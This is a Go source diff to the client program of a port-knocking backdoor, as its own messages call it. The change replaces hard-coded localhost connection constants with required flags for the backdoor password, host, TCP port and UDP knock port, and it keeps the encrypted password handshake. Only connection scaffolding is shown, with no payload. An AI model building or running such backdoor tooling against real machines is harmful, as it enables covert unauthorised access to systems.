@@ -8,6 +8,7 @@ import (
 	"crypto/hmac"
 	"crypto/rand"
 	"crypto/sha256"
+	"flag"
 	"fmt"
 	"net"
 	"os"
@@ -81,24 +82,24 @@ func recvThread(conn net.Conn, gcm cipher.AEAD, info []byte, wg *sync.WaitGroup)
 	wg.Done()
 }
 
-const (
-	CONN_HOST    = "localhost"
-	CONN_PORT    = "3333"
-	CONN_UDPPORT = "6666"
-	CONN_TIMEOUT = 2
-)
-
 func main() {
-	if len(os.Args) < 2 {
-		fmt.Println("Needs 1 argument: the password")
-		os.Exit(1)
-	} else if len(os.Args) != 2 {
-		fmt.Println("Needs only 1 argument: the password")
+	PASS := flag.String("p", "\000", "PASSWORD argument: required")
+	CONN_HOST := flag.String("h", "\000", "HOST argument: required")
+	CONN_PORT := flag.String("t", "\000", "TCPPORT argument: required")
+	CONN_UDPPORT := flag.String("u", "\000", "UDPPORT argument: required")
+	flag.Parse()
+
+	if *PASS == "\000" || *CONN_HOST == "\000" || *CONN_PORT == "\000" || *CONN_UDPPORT == "\000" {
+		fmt.Println("You must provide all of these required flags:")
+		fmt.Println("-p: the password to this backdoor")
+		fmt.Println("-t: the tcp port used for main communication")
+		fmt.Println("-u: the udp port used for knocking")
+		fmt.Println("-h: the hostname")
 		os.Exit(1)
 	}
 
 	// Begin connection
-	udp, uerr := net.Dial("udp", CONN_HOST+":"+CONN_UDPPORT)
+	udp, uerr := net.Dial("udp", *CONN_HOST+":"+*CONN_UDPPORT)
 	if uerr != nil {
 		fmt.Println("Error dialing the backdoor, exiting...")
 		os.Exit(1)
@@ -109,7 +110,7 @@ func main() {
 	var err error
 	// Retry every 250ms for 2s
 	for i := 0; i < 8; i++ {
-		conn, err = net.Dial("tcp", CONN_HOST+":"+CONN_PORT)
+		conn, err = net.Dial("tcp", *CONN_HOST+":"+*CONN_PORT)
 		if err != nil {
 			time.Sleep(250 * time.Millisecond)
 		} else {
@@ -153,7 +154,7 @@ func main() {
 	info = hm.Sum(nil)
 
 	// Send the password, TODO. make it parameterizable
-	pt := []byte(os.Args[1])
+	pt := []byte(*PASS)
 	ct := seal(pt, info, gcm)
 	conn.Write(ct)
 
